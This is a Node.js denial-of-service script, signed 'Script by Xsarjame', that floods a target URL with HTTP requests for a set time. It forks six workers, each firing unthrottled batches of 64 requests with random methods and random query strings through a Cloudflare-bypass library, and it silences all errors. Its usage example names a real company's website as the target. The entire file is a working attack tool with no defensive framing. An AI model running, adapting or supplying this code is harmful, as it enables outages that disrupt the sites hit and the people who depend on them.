require('events').EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});

const CloudflareBypasser = require('cloudflare-bypasser');
const path = require('path');
const cluster = require('cluster');
let cf = new CloudflareBypasser();
	
function randstr(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * 
 charactersLength));
   }
   return result;
}

if (process.argv.length !== 4) {
    console.log(`
        Usage: node ${path.basename(__filename)} <url> <time> 
        Usage: node ${path.basename(__filename)} <http://www.pfizer.com> <1000>
            Scri
    `);
    process.exit(0);
}

const target = process.argv[2],
    time = process.argv[3];

if (cluster.isMaster){
    for (let i = 0; i < 6; i++){
        cluster.fork();
    }
    console.log('Attacking Started | Script by Xsarjame');
    setTimeout(() => {
        console.log('Attack ended.');
        process.exit(0)
    }, time * 1000);
} else {
    setInterval(() => {
        send_req();
    });
}

let met = ["GET","POST","HEAD","PUT","DELETE"]

function send_req() {
	for (let i = 0; i < 64; ++i) {
		cf.request({
			method: met[Math.floor((Math.random() * met.length))],
			uri: `${target}?s=${randstr(25)}`
		});
	}	
}
